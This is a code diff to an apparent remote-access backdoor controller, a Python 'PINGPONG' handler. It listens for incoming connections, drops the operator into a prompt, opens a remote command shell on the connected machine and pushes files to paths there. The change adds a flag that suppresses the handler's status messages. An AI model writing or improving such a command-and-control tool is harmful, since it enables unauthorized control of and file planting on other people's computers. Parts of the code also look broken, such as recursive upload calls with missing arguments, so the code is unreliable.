@@ -9,7 +9,7 @@ import sys
 import shutil
 import cmdshell
 import time
-def startserver(ip, port):
+def startserver(ip, port, printf):
     if port == "":
         port = 624
     if ip == "":
@@ -27,33 +27,42 @@ def startserver(ip, port):
     except socket.error as msg:
         print("handler>[-]something went WRONG, print out the wrong msg: " + str(msg))
         sys.exit(1)
-    print('handler>[*]Starting handler at ' + ip + ":" + str(port))
+    if printf:
+        print('handler>[*]Starting handler at ' + ip + ":" + str(port))
 
     while True:
         conn, addr = s.accept()
-        t = threading.Thread(target=PINGPONG_shell, args=(conn, addr, ip, port))
+        t = threading.Thread(target=PINGPONG_shell, args=(conn, addr, ip, port, True))
         t.start()
 
-def PINGPONG_shell(conn, addr, ip, port):
-    def App_send(App):
-        print("PINGPONG>[*]Sending application......")
+def PINGPONG_shell(conn, addr, ip, port, printf):
+    def App_send(App, printf):
+        if printf:
+            print("PINGPONG>[*]Sending application......")
         conn.send(bytes(App, 'utf8'))
         while True:
             data = conn.recv(1024)
             if data.decode() == "OK":
-                print("PINGPONG>[*]Application done, everything is OK")
+                if printf:
+                    print("PINGPONG>[*]Application done, everything is OK")
                 return True
-    def Upload(file_dir, to_dir):
+    def Upload(file_dir, to_dir, printf, APP_SEND):
         try:
-            if App_send("UPLOAD_APP"):
-                print("PINGPONG>[*]Sending dir......")
+            if APP_SEND:
+                IS_C =  App_send("UPLOAD_APP", False)
+            else:
+                IS_C = True
+            if IS_C:
+                if printf:
+                    print("PINGPONG>[*]Sending dir......")
                 conn.send(bytes(to_dir, "utf8"))
                 path = "temp"
                 if os.path.exists(path):
                     shutil.rmtree(path)
                 if not os.path.exists(path):
                     os.makedirs(path)
-                print("PINGPONG>[*]Copy to file to " + path + "......")
+                if printf:
+                    print("PINGPONG>[*]Copy to file to " + path + "......")
                 if not os.path.isfile(file_dir):
                     try:
                         file_names = os.listdir(file_dir)
@@ -104,14 +113,13 @@ def PINGPONG_shell(conn, addr, ip, port):
                             file_dir = input("PINGPONG>[*]Please input the location of the file in your host>")
                             to_dir = input("PINGPONG>[*]Please input the location of the file where you uploaded>")
                             Upload(file_dir, to_dir)
-                        else:
-                            return True
                     old_n = os.path.join(path, file)
                     new_name = file + ".txt"
                     os.rename(old_n, new_name)
                     file_name = file_dir.split(".txt")[0]
                     file_names =  file_name[file_name.rindex('/') + 1:len(file_name)]
-                    print("PINGPONG>[*]Sending file......")
+                    if printf:
+                        print("PINGPONG>[*]Sending file......")
                     f = open(file_names + ".txt")
                     se_data = f.read()
                     conn.send(bytes(new_name, "utf8"))
@@ -141,20 +149,21 @@ def PINGPONG_shell(conn, addr, ip, port):
                 Upload(file_dir, to_dir)
             else:
                 return True
-    print('handler>[+]Accept new connection from: ' + ip + ":" + str(port))
+    if printf:
+        print('handler>[+]Accept new connection from: ' + ip + ":" + str(port))
     while True:
         command = input("PINGPONG>")
         if command == "cmd" or command == "CMD":
-            if App_send("CMDSHELL_APP"):
+            if App_send("CMDSHELL_APP", True):
                 print("PINGPONG>[+]GOT IT")
                 cmdshell.start(ip, 8625)
         elif command == "upload" or command == "UPLOAD":
             file_dir = input("PINGPONG>[*]Please input the location of the file in your host>")
             to_dir = input("PINGPONG>[*]Please input the location of the file where you uploaded>")
-            Upload(file_dir, to_dir)
+            Upload(file_dir, to_dir, True, True)
             
         else:
             print("PINGPONG>[-]Command " + command + " not found")
                     
 if __name__ == "__main__":
-    startserver("192.168.140.1", "")
+    startserver("192.168.140.1", "", True)
